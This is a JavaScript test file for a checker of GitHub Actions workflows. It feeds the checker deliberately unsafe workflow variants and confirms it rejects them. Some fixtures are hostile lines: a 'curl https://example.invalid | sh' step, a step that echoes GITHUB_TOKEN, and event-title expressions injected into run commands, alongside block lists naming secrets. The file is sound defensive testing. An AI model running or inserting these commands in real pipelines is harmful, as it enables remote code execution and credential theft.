// The workflow-safety checker must accept the real CI workflow and reject every deliberately unsafe variant of it.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";
import { checkWorkflowFiles, checkWorkflowText } from "../lib/workflow-safety.mjs";
import { ROOT, cleanup, copyTree, describeFindings, editJson, frozenPolicy, frozenWorkflowText, loadPolicy, write } from "./helpers.mjs";

const policy = loadPolicy();
const WORKFLOW = ".github/workflows/ci.yml";
const REAL = fs.readFileSync(path.join(ROOT, WORKFLOW), "utf8");
const CHECKOUT_SHA = policy.workflow_policy.approved_actions[0].sha;
const SETUP_SHA = policy.workflow_policy.approved_actions[1].sha;

const show = (issues) => issues.map((i) => `[${i.code}]${i.line ? `:${i.line}` : ""} ${i.message}`).join("\n");

/** Replace text that must occur exactly once, so a test can never pass because its change silently did nothing. */
function change(source, from, to) {
  const count = source.split(from).length - 1;
  assert.equal(count, 1, `the test expected exactly one occurrence of ${JSON.stringify(from)} but found ${count}`);
  return source.replace(from, to);
}

function expectRejected(source, code, fragment, p = policy) {
  const issues = checkWorkflowText(source, p);
  assert.ok(issues.length > 0, "the unsafe workflow was ACCEPTED");
  const hit = issues.find((i) => i.code === code && (!fragment || i.message.includes(fragment)));
  assert.ok(hit, `expected a ${code} finding${fragment ? ` containing "${fragment}"` : ""}, got:\n${show(issues)}`);
  assert.ok(Number.isInteger(hit.line) || hit.line === null);
  return issues;
}

test("the real CI workflow matches the approved shape", () => {
  const issues = checkWorkflowText(REAL, policy);
  assert.deepEqual(issues, [], show(issues));
});

test("the frozen CI definition used to replay the recorded real runs still satisfies the checker under its own policy, and the live CI still contains every one of its commands, in order", () => {
  const frozen = frozenPolicy();
  const issues = checkWorkflowText(frozenWorkflowText(), frozen);
  assert.deepEqual(issues, [], show(issues));
  const live = policy.workflow_policy.required_commands;
  let at = -1;
  for (const command of frozen.workflow_policy.required_commands) {
    const found = live.indexOf(command, at + 1);
    assert.ok(found > at, `the live policy dropped or reordered the command ${JSON.stringify(command)}`);
    at = found;
  }
});

test("the live CI runs the database and browser regression suites (PLAT-0004 corrections), after the operations checks and before the build", () => {
  const commands = policy.workflow_policy.required_commands;
  const idx = (c) => commands.indexOf(c);
  for (const c of ["npm run test:db", "npm run test:browser"]) assert.ok(idx(c) > idx("npm run ops:test") && idx(c) < idx("npm run build"), c);
  assert.ok(idx("npm run test:db") < idx("npm run test:browser"));
  assert.ok(idx("npm install --no-save --ignore-scripts --no-audit --no-fund playwright@1.63.0") < idx("npx playwright install --with-deps chromium"));
  assert.ok(idx("npx playwright install --with-deps chromium") < idx("npm run test:browser"));
  assert.ok(REAL.includes("run: npm run test:db") && REAL.includes("run: npm run test:browser"));
  assert.ok(policy.workflow_policy.max_timeout_minutes >= 20 && REAL.includes("timeout-minutes: 20"));
});

test("the real repository passes the file-level check", () => {
  assert.deepEqual(checkWorkflowFiles(ROOT, policy), []);
});

test("the real workflow is read-only, unprivileged and does not deploy (assertions on the file itself)", () => {
  assert.match(REAL, /^permissions:\n {2}contents: read\n/m);
  assert.ok(!/permissions:[^]*write/i.test(REAL.replace(/^#.*$/gm, "")), "no write permission anywhere");
  const code = REAL.replace(/^\s*#.*$/gm, "");
  for (const banned of ["pull_request_target", "workflow_run", "workflow_dispatch", "schedule", "secrets.", "github.token", "GITHUB_TOKEN", "environment:", "self-hosted", "id-token", "vercel", "deploy"]) {
    assert.ok(!code.includes(banned), `the workflow must not contain "${banned}"`);
  }
  assert.ok(code.includes("persist-credentials: false"));
  assert.ok(code.includes("--ignore-scripts"));
  assert.ok(code.includes("package-manager-cache: false"));
  for (const cmd of ["npm run lint", "npx tsc --noEmit", "npm run ops:validate", "npm run ops:test", "npm run build"]) assert.ok(code.includes(cmd), cmd);
  assert.ok(code.includes(`actions/checkout@${CHECKOUT_SHA}`));
  assert.ok(code.includes(`actions/setup-node@${SETUP_SHA}`));
});

test("triggers", async (t) => {
  await t.test("pull_request_target is rejected, with the reason", () => {
    expectRejected(change(REAL, "on:\n  push:", "on:\n  pull_request_target:\n    branches:\n      - main\n  push:"), "WF-TRIGGER", "pull_request_target");
  });
  await t.test("the explanation of pull_request_target mentions secrets and an untrusted pull request", () => {
    const issues = expectRejected(change(REAL, "on:\n  push:", "on:\n  pull_request_target:\n    branches:\n      - main\n  push:"), "WF-TRIGGER", "untrusted");
    assert.ok(issues.some((i) => i.message.includes("secrets")));
  });
  await t.test("workflow_run is rejected", () => {
    expectRejected(change(REAL, "on:\n  push:", "on:\n  workflow_run:\n    branches:\n      - main\n  push:"), "WF-TRIGGER", "workflow_run");
  });
  await t.test("workflow_dispatch is rejected", () => {
    expectRejected(change(REAL, "on:\n  push:", "on:\n  workflow_dispatch:\n  push:"), "WF-TRIGGER", "workflow_dispatch");
  });
  await t.test("a schedule is rejected", () => {
    expectRejected(change(REAL, "on:\n  push:", "on:\n  schedule:\n    branches:\n      - main\n  push:"), "WF-TRIGGER", "schedule");
  });
  await t.test("an event that is neither approved nor listed is still rejected", () => {
    expectRejected(change(REAL, "on:\n  push:", "on:\n  fork:\n    branches:\n      - main\n  push:"), "WF-TRIGGER", 'event "fork" is not approved');
  });
  await t.test("adding main to the push branches is rejected", () => {
    expectRejected(change(REAL, "      - claude-dev\n  pull_request:", "      - claude-dev\n      - main\n  pull_request:"), "WF-TRIGGER", "branches must be exactly");
  });
  await t.test("a wildcard push filter is rejected", () => {
    expectRejected(change(REAL, '      - "claude/**"\n', '      - "**"\n'), "WF-TRIGGER", "branches must be exactly");
  });
  await t.test("dropping a pull_request target branch is rejected", () => {
    expectRejected(change(REAL, "      - claude-dev\n      - main\n", "      - claude-dev\n"), "WF-TRIGGER", "branches must be exactly");
  });
  await t.test("a missing approved event is rejected", () => {
    const cut = REAL.replace(/ {2}pull_request:\n {4}branches:\n {6}- claude-dev\n {6}- main\n/, "");
    assert.notEqual(cut, REAL);
    expectRejected(cut, "WF-TRIGGER", 'approved event "pull_request" is missing');
  });
  await t.test("a paths filter is rejected", () => {
    expectRejected(change(REAL, "  pull_request:\n    branches:", "  pull_request:\n    paths-ignore:\n      - docs/**\n    branches:"), "WF-TRIGGER", "paths-ignore");
  });
  await t.test("a bare event name is rejected", () => {
    expectRejected(change(REAL, /on:\n[^]*?\npermissions:/.exec(REAL)[0], "on: push\n\npermissions:"), "WF-TRIGGER", "must be a mapping");
  });
  await t.test("a forbidden event hidden behind a quoted key is still found", () => {
    expectRejected(change(REAL, "on:\n  push:", 'on:\n  "pull_request_target":\n    branches:\n      - main\n  push:'), "WF-TRIGGER", "pull_request_target");
  });
});

test("token permissions", async (t) => {
  await t.test("write access to contents is rejected", () => {
    expectRejected(change(REAL, "  contents: read", "  contents: write"), "WF-PERMISSIONS", 'must be "read"');
  });
  await t.test("a missing permissions block is rejected", () => {
    expectRejected(change(REAL, "permissions:\n  contents: read\n\n", ""), "WF-PERMISSIONS", "no top-level");
  });
  await t.test("write-all is rejected", () => {
    expectRejected(change(REAL, "permissions:\n  contents: read\n", "permissions: write-all\n"), "WF-PERMISSIONS", "blanket");
  });
  await t.test("read-all is rejected (explicit scopes only)", () => {
    expectRejected(change(REAL, "permissions:\n  contents: read\n", "permissions: read-all\n"), "WF-PERMISSIONS", "blanket");
  });
  await t.test("an extra scope (pull-requests: write) is rejected", () => {
    expectRejected(change(REAL, "  contents: read\n\nconcurrency", "  contents: read\n  pull-requests: write\n\nconcurrency"), "WF-PERMISSIONS", 'the permission "pull-requests" is not allowed');
  });
  await t.test("id-token: write is rejected", () => {
    expectRejected(change(REAL, "  contents: read\n\nconcurrency", "  contents: read\n  id-token: write\n\nconcurrency"), "WF-PERMISSIONS", 'the permission "id-token" is not allowed');
  });
  await t.test("a job that raises its own permissions is rejected", () => {
    expectRejected(change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    permissions:\n      contents: write\n"), "WF-KEYS", "permissions");
  });
});

test("secrets and credentials", async (t) => {
  await t.test("a secret passed to an action input is rejected", () => {
    expectRejected(change(REAL, "          persist-credentials: false\n", "          persist-credentials: false\n          token: ${{ secrets.DEPLOY_TOKEN }}\n"), "WF-SECRETS", "credential");
  });
  await t.test("environment variables carrying a token are rejected", () => {
    const src = change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    env:\n      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n");
    expectRejected(src, "WF-SECRETS", "credential");
    expectRejected(src, "WF-KEYS", "env");
  });
  await t.test("a Claude authentication token anywhere is rejected", () => {
    expectRejected(change(REAL, "          package-manager-cache: false\n", "          package-manager-cache: false\n          claude_code_oauth_token: abc\n"), "WF-SECRETS", "credential");
  });
  await t.test("a database credential name is rejected", () => {
    expectRejected(change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    env:\n      SUPABASE_SERVICE_ROLE_KEY: x\n"), "WF-SECRETS", "credential");
  });
  await t.test("the workflow token referenced by name is rejected", () => {
    expectRejected(change(REAL, "      - name: Build\n        run: npm run build\n", "      - name: Build\n        run: npm run build\n      - name: Leak\n        run: echo $GITHUB_TOKEN\n"), "WF-SECRETS", "credential");
  });
  await t.test("a provider API key given to a command is rejected", () => {
    expectRejected(change(REAL, "        run: npm run lint\n", "        run: ANTHROPIC_API_KEY=x npm run lint\n"), "WF-RUN", "not approved");
  });
});

test("deployment and production", async (t) => {
  await t.test("an environment is rejected", () => {
    const src = change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    environment: production\n");
    expectRejected(src, "WF-KEYS", "environment");
    expectRejected(src, "WF-DEPLOY", "production");
  });
  await t.test("a deploy command is rejected", () => {
    const src = change(REAL, "      - name: Build\n        run: npm run build\n", "      - name: Build\n        run: npm run build\n      - name: Ship\n        run: npx vercel deploy --prod\n");
    expectRejected(src, "WF-RUN", "not approved");
    expectRejected(src, "WF-DEPLOY", "vercel");
  });
  await t.test("a step named like a deployment is rejected", () => {
    expectRejected(change(REAL, "      - name: Build\n", "      - name: Deploy preview\n"), "WF-DEPLOY", "deploy");
  });
  await t.test("a git push is rejected", () => {
    expectRejected(change(REAL, "        run: npm run build\n", "        run: git push origin main\n"), "WF-RUN", "not approved");
  });
  await t.test("a deployment action is rejected", () => {
    expectRejected(change(REAL, "      - name: Lint\n        run: npm run lint\n", `      - name: Lint\n        run: npm run lint\n      - uses: someone/deploy-action@${"a".repeat(40)} # v1.0.0\n`), "WF-ACTIONS", "not approved");
  });
  await t.test("npm publish is rejected", () => {
    expectRejected(change(REAL, "        run: npm run build\n", "        run: npm publish\n"), "WF-RUN", "not approved");
  });
});

test("actions must be approved and pinned to the approved commit", async (t) => {
  const checkoutLine = `        uses: actions/checkout@${CHECKOUT_SHA} # v7.0.1\n`;
  const sub = (to) => change(REAL, checkoutLine, `        uses: ${to}\n`);
  await t.test("a version tag instead of a SHA", () => expectRejected(sub("actions/checkout@v7 # v7.0.1"), "WF-ACTIONS", "not pinned"));
  await t.test("a branch name instead of a SHA", () => expectRejected(sub("actions/checkout@main # v7.0.1"), "WF-ACTIONS", "not pinned"));
  await t.test("a short SHA", () => expectRejected(sub("actions/checkout@3d3c42e # v7.0.1"), "WF-ACTIONS", "not pinned"));
  await t.test("no version at all", () => expectRejected(sub("actions/checkout # v7.0.1"), "WF-ACTIONS", "no version"));
  await t.test("a different full SHA", () => expectRejected(sub(`actions/checkout@${"b".repeat(40)} # v7.0.1`), "WF-ACTIONS", "not the commit approved"));
  await t.test("an action that is not approved", () => expectRejected(sub(`actions/cache@${"c".repeat(40)} # v4.0.0`), "WF-ACTIONS", "not approved"));
  await t.test("a third-party action", () => expectRejected(sub(`thirdparty/tool@${"d".repeat(40)} # v1.0.0`), "WF-ACTIONS", "not approved"));
  await t.test("a local action", () => expectRejected(sub("./.github/actions/mine"), "WF-ACTIONS", "local actions"));
  await t.test("a container action", () => expectRejected(sub("docker://alpine:3.20"), "WF-ACTIONS", "container actions"));
  await t.test("a missing version comment", () => expectRejected(sub(`actions/checkout@${CHECKOUT_SHA}`), "WF-ACTIONS", "trailing comment"));
  await t.test("a version comment that disagrees with the policy", () => expectRejected(sub(`actions/checkout@${CHECKOUT_SHA} # v1.0.0`), "WF-ACTIONS", "trailing comment"));
  await t.test("a subpath of an approved action is a different action", () => expectRejected(sub(`actions/checkout/sub@${CHECKOUT_SHA} # v7.0.1`), "WF-ACTIONS", "not approved"));
  await t.test("checkout that keeps credentials (persist-credentials: true)", () => {
    expectRejected(change(REAL, "          persist-credentials: false\n", "          persist-credentials: true\n"), "WF-ACTIONS", "must be \"false\"");
  });
  await t.test("checkout without persist-credentials", () => {
    expectRejected(change(REAL, "        with:\n          persist-credentials: false\n", ""), "WF-ACTIONS", "persist-credentials");
  });
  await t.test("checkout with an extra input", () => {
    expectRejected(change(REAL, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n"), "WF-ACTIONS", 'input "ref"');
  });
  await t.test("a dependency cache on setup-node", () => {
    expectRejected(change(REAL, "          package-manager-cache: false\n", "          package-manager-cache: false\n          cache: npm\n"), "WF-ACTIONS", 'input "cache"');
  });
  await t.test("automatic package-manager caching switched on", () => {
    expectRejected(change(REAL, "          package-manager-cache: false\n", "          package-manager-cache: true\n"), "WF-ACTIONS", "must be \"false\"");
  });
  await t.test("a different Node version than the policy", () => {
    expectRejected(change(REAL, "          node-version: 22\n", "          node-version: 18\n"), "WF-ACTIONS", "node-version");
  });
});

test("the verification commands", async (t) => {
  const stepOf = (name, cmd) => `      - name: ${name}\n        run: ${cmd}\n`;
  for (const [name, cmd] of [["Lint", "npm run lint"], ["Type check", "npx tsc --noEmit"], ["Validate project memory and workflows", "npm run ops:validate"], ["Run the operations tests", "npm run ops:test"], ["Build", "npm run build"]]) {
    await t.test(`removing "${cmd}" is rejected`, () => {
      expectRejected(change(REAL, stepOf(name, cmd), ""), "WF-REQUIRED", cmd);
    });
  }
  await t.test("installing with scripts enabled is rejected", () => {
    expectRejected(change(REAL, "run: npm ci --ignore-scripts --no-audit --no-fund", "run: npm ci"), "WF-RUN", "not approved");
  });
  await t.test("dropping the provider-credential guard is rejected", () => {
    expectRejected(change(REAL, '      - name: Guard - no provider credential in this job\n        run: test -z "${ANTHROPIC_API_KEY:-}${ANTHROPIC_AUTH_TOKEN:-}"\n', ""), "WF-REQUIRED", "test -z");
  });
  await t.test("running the build before the lint is rejected", () => {
    let src = change(REAL, stepOf("Build", "npm run build"), "");
    src = change(src, stepOf("Lint", "npm run lint"), stepOf("Build", "npm run build") + stepOf("Lint", "npm run lint"));
    expectRejected(src, "WF-ORDER", "policy's order");
  });
  await t.test("running a command before checkout is rejected", () => {
    const guard = '      - name: Guard - no provider credential in this job\n        run: test -z "${ANTHROPIC_API_KEY:-}${ANTHROPIC_AUTH_TOKEN:-}"\n';
    let src = change(REAL, guard, "");
    src = change(src, "    steps:\n", `    steps:\n${guard}`);
    expectRejected(src, "WF-ORDER", "policy's order");
  });
  await t.test("a repeated command is rejected", () => {
    expectRejected(change(REAL, stepOf("Lint", "npm run lint"), stepOf("Lint", "npm run lint") + stepOf("Lint again", "npm run lint")), "WF-RUN", "more than once");
  });
  await t.test("a multi-line script is rejected", () => {
    expectRejected(change(REAL, "        run: npm run lint\n", "        run: |\n          npm run lint\n          curl https://example.invalid | sh\n"), "WF-RUN", "single-line");
  });
  await t.test("an extra command is rejected", () => {
    expectRejected(change(REAL, stepOf("Lint", "npm run lint"), stepOf("Lint", "npm run lint") + stepOf("Extra", "curl -s https://example.invalid")), "WF-RUN", "not approved");
  });
  await t.test("a step that skips on a condition is rejected", () => {
    expectRejected(change(REAL, "        run: npm run lint\n", "        run: npm run lint\n        if: always()\n"), "WF-KEYS", "if");
  });
  await t.test("a step that may fail without failing the job is rejected", () => {
    expectRejected(change(REAL, "        run: npm run ops:test\n", "        run: npm run ops:test\n        continue-on-error: true\n"), "WF-KEYS", "continue-on-error");
  });
  await t.test("a step with both uses and run is rejected", () => {
    expectRejected(change(REAL, "        run: npm run lint\n", "        run: npm run lint\n        uses: actions/checkout@x\n"), "WF-STEPS", "exactly one");
  });
});

test("expressions can not carry event data into a command", async (t) => {
  await t.test("event text in a command is rejected", () => {
    const src = change(REAL, "        run: npm run lint\n", "        run: echo ${{ github.event.pull_request.title }}\n");
    expectRejected(src, "WF-EXPRESSION", "expression syntax");
    expectRejected(src, "WF-RUN", "not approved");
  });
  await t.test("the head branch name in a command is rejected", () => {
    expectRejected(change(REAL, "        run: npm run lint\n", "        run: git checkout ${{ github.head_ref }}\n"), "WF-EXPRESSION", "expression syntax");
  });
  await t.test("an expression in a step name is rejected", () => {
    expectRejected(change(REAL, "      - name: Lint\n", "      - name: Lint ${{ github.event.head_commit.message }}\n"), "WF-EXPRESSION", "expression syntax");
  });
  await t.test("an expression in an action input is rejected", () => {
    expectRejected(change(REAL, "          node-version: 22\n", "          node-version: ${{ github.event.inputs.v }}\n"), "WF-EXPRESSION", "expression syntax");
  });
  await t.test("only github.workflow and github.ref may appear in the concurrency group", () => {
    expectRejected(change(REAL, "ci-${{ github.workflow }}-${{ github.ref }}", "ci-${{ github.head_ref }}"), "WF-EXPRESSION", "expression syntax");
  });
});

test("runner, timeout, concurrency and structure", async (t) => {
  await t.test("a self-hosted runner is rejected", () => expectRejected(change(REAL, "runs-on: ubuntu-24.04", "runs-on: self-hosted"), "WF-RUNNER", "self-hosted"));
  await t.test("a floating runner label that the policy does not list is rejected", () => expectRejected(change(REAL, "runs-on: ubuntu-24.04", "runs-on: ubuntu-latest"), "WF-RUNNER", "not approved"));
  await t.test("a missing timeout is rejected", () => expectRejected(change(REAL, "    timeout-minutes: 20\n", ""), "WF-TIMEOUT", "timeout-minutes"));
  await t.test("an excessive timeout is rejected", () => expectRejected(change(REAL, "timeout-minutes: 20", "timeout-minutes: 360"), "WF-TIMEOUT", "from 1 to"));
  await t.test("a non-numeric timeout is rejected", () => expectRejected(change(REAL, "timeout-minutes: 20", "timeout-minutes: 0x10"), "WF-TIMEOUT", "from 1 to"));
  await t.test("missing concurrency is rejected", () => expectRejected(change(REAL, "concurrency:\n  group: ci-${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\n", ""), "WF-CONCURRENCY", "no \"concurrency:\""));
  await t.test("cancel-in-progress false is rejected", () => expectRejected(change(REAL, "cancel-in-progress: true", "cancel-in-progress: false"), "WF-CONCURRENCY", "must be true"));
  await t.test("a second job is rejected", () => {
    expectRejected(`${REAL}\n  second:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: npm run lint\n`, "WF-JOBS", "exactly one job");
  });
  await t.test("a top-level env block is rejected", () => expectRejected(change(REAL, "permissions:\n", "env:\n  A: b\n\npermissions:\n"), "WF-KEYS", "env"));
  await t.test("a job container is rejected", () => expectRejected(change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    container: node:22\n"), "WF-KEYS", "container"));
  await t.test("a job needing another job is rejected", () => expectRejected(change(REAL, "    timeout-minutes: 20\n", "    timeout-minutes: 20\n    needs: other\n"), "WF-KEYS", "needs"));
  await t.test("a step working directory is rejected", () => expectRejected(change(REAL, "        run: npm run lint\n", "        run: npm run lint\n        working-directory: ops\n"), "WF-KEYS", "working-directory"));
});

test("YAML constructs the reader cannot interpret unambiguously are rejected, not guessed", async (t) => {
  await t.test("an anchor", () => expectRejected(change(REAL, "name: CI\n", "name: &n CI\n"), "WF-SYNTAX", "anchors"));
  await t.test("an alias", () => expectRejected(change(REAL, "name: CI\n", "name: *n\n"), "WF-SYNTAX", "anchors"));
  await t.test("a flow mapping for permissions", () => expectRejected(change(REAL, "permissions:\n  contents: read\n", "permissions: {contents: write}\n"), "WF-SYNTAX", "flow mappings"));
  await t.test("a duplicate permissions key (last one would win in some readers)", () => expectRejected(change(REAL, "concurrency:\n", "permissions:\n  contents: write\n\nconcurrency:\n"), "WF-SYNTAX", "duplicate key"));
  await t.test("a tab", () => expectRejected(change(REAL, "  contents: read", "\tcontents: read"), "WF-SYNTAX", "tabs"));
  await t.test("a second document", () => expectRejected(`${REAL}\n---\non: pull_request_target\n`, "WF-SYNTAX", "document markers"));
  await t.test("text that is not a mapping", () => expectRejected("- a\n- b\n", "WF-SYNTAX", "mapping"));
  await t.test("an empty file", () => {
    const issues = checkWorkflowText("", policy);
    assert.ok(issues.length > 0);
  });
});

test("a dangerous token that survives the structured checks is still caught by the raw scan", () => {
  // A step NAME may hold any text as far as the structured checks go, so only the independent raw scan can see this.
  const src = change(REAL, "      - name: Build\n", "      - name: Build then pull_request_target\n");
  const issues = checkWorkflowText(src, policy);
  assert.ok(issues.some((i) => i.code === "WF-RAW" && i.message.includes("pull_request_target")), show(issues));
  // ... while the same words inside a comment are harmless and are not reported
  assert.deepEqual(checkWorkflowText(change(REAL, "name: CI\n", "name: CI # never use pull_request_target or secrets.X here\n"), policy), []);
});

test("findings point at the offending line", () => {
  const src = change(REAL, "  contents: read", "  contents: write");
  const issue = checkWorkflowText(src, policy).find((i) => i.code === "WF-PERMISSIONS");
  assert.equal(src.split("\n")[issue.line - 1].trim(), "contents: write");
});

test("file-level checks", async (t) => {
  await t.test("an extra workflow file is rejected", () => {
    const dir = copyTree();
    try {
      write(dir, ".github/workflows/deploy.yml", REAL);
      assert.ok(checkWorkflowFiles(dir, policy).some((i) => i.code === "WF-FILE-UNAPPROVED" && i.file === ".github/workflows/deploy.yml"));
    } finally {
      cleanup(dir);
    }
  });
  await t.test("an extra workflow with an upper-case extension is rejected too", () => {
    const dir = copyTree();
    try {
      write(dir, ".github/workflows/extra.YML", REAL);
      assert.ok(checkWorkflowFiles(dir, policy).some((i) => i.code === "WF-FILE-UNAPPROVED"));
    } finally {
      cleanup(dir);
    }
  });
  await t.test("a missing required workflow is rejected", () => {
    const dir = copyTree();
    try {
      fs.rmSync(path.join(dir, WORKFLOW));
      assert.ok(checkWorkflowFiles(dir, policy).some((i) => i.code === "WF-FILE-MISSING"));
    } finally {
      cleanup(dir);
    }
  });
  await t.test("a local action directory is rejected", () => {
    const dir = copyTree();
    try {
      write(dir, ".github/actions/mine/action.yml", "name: mine\nruns:\n  using: node24\n  main: index.js\n");
      assert.ok(checkWorkflowFiles(dir, policy).some((i) => i.code === "WF-LOCAL-ACTION"));
    } finally {
      cleanup(dir);
    }
  });
  await t.test("an unsafe edit to the approved workflow file is reported with the file name", () => {
    const dir = copyTree();
    try {
      write(dir, WORKFLOW, change(REAL, "  contents: read", "  contents: write"));
      const issues = checkWorkflowFiles(dir, policy);
      assert.ok(issues.some((i) => i.file === WORKFLOW && i.code === "WF-PERMISSIONS"), JSON.stringify(issues));
    } finally {
      cleanup(dir);
    }
  });
});

test("a policy cannot be used to weaken the check silently (checked by the memory validator)", async (t) => {
  const { validateMemory } = await import("../validate-memory.mjs");
  const broken = (fn) => {
    const dir = copyTree();
    try {
      fn(dir);
      return validateMemory({ root: dir });
    } finally {
      cleanup(dir);
    }
  };
  const POLICY = "docs/project-memory/policy/policy.json";
  await t.test("the real tree passes", () => {
    const r = validateMemory({ root: ROOT });
    assert.equal(r.ok, true, describeFindings(r));
  });
  await t.test("an unsafe workflow fails npm run ops:validate", () => {
    const r = broken((d) => write(d, WORKFLOW, change(REAL, "  contents: read", "  contents: write")));
    assert.equal(r.ok, false);
    assert.ok(r.findings.items.some((i) => i.code === "WF-PERMISSIONS" && i.file === WORKFLOW), describeFindings(r));
  });
  await t.test("removing pull_request_target from the forbidden list is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.forbidden_triggers = p.workflow_policy.forbidden_triggers.filter((x) => x !== "pull_request_target"); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("pull_request_target")), describeFindings(r));
  });
  await t.test("allowing an event that is also forbidden is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.forbidden_triggers = [...p.workflow_policy.forbidden_triggers, "push"]; }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("both allowed and forbidden")), describeFindings(r));
  });
  await t.test("running CI on pushes to main is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.allowed_triggers.push.push("main"); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("production branch")), describeFindings(r));
  });
  await t.test("a self-hosted runner is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.runners.push("self-hosted"); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("self-hosted")), describeFindings(r));
  });
  await t.test("dropping a verification command from the policy is an invariant error", () => {
    for (const cmd of ["npm run lint", "npx tsc --noEmit", "npm run ops:validate", "npm run ops:test", "npm run build"]) {
      const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.required_commands = p.workflow_policy.required_commands.filter((c) => c !== cmd); }));
      assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes(cmd)), `${cmd}: ${describeFindings(r)}`);
    }
  });
  await t.test("dropping the credential guard from the policy is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.required_commands = p.workflow_policy.required_commands.filter((c) => !c.startsWith("test -z")); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("guard")), describeFindings(r));
  });
  await t.test("approving checkout without persist-credentials: false is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.approved_actions[0].required_inputs = []; }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("persist-credentials")), describeFindings(r));
  });
  await t.test("approving setup-node with caching left on is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.approved_actions[1].required_inputs = p.workflow_policy.approved_actions[1].required_inputs.filter((i) => i.name !== "package-manager-cache"); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("package-manager-cache")), describeFindings(r));
  });
  await t.test("approving an action input that looks like a credential is an invariant error", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.approved_actions[0].required_inputs.push({ name: "token", value: "x" }); }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-INVARIANT" && i.message.includes("looks like a credential")), describeFindings(r));
  });
  await t.test("a write permission in the policy does not pass the schema", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.max_token_permissions.contents = "write"; }));
    assert.equal(r.ok, false);
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-SCHEMA"), describeFindings(r));
  });
  await t.test("an approved action that is not pinned to a full SHA does not pass the schema", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.approved_actions[0].sha = "v7"; }));
    assert.ok(r.findings.items.some((i) => i.code === "POLICY-SCHEMA" && i.message.includes("sha")), describeFindings(r));
  });
  await t.test("a CI design that no human decision approved is rejected", () => {
    const r = broken((d) => editJson(d, POLICY, (p) => { p.workflow_policy.approval_reference = "HD-9999"; }));
    assert.ok(r.findings.items.some((i) => i.code === "WF-POLICY"), describeFindings(r));
  });
  await t.test("a workflow listed as allowed but absent from the required list can exist, an unlisted one cannot", () => {
    const r = broken((d) => write(d, ".github/workflows/other.yml", REAL));
    assert.ok(r.findings.items.some((i) => i.code === "WF-FILE-UNAPPROVED"), describeFindings(r));
  });
});
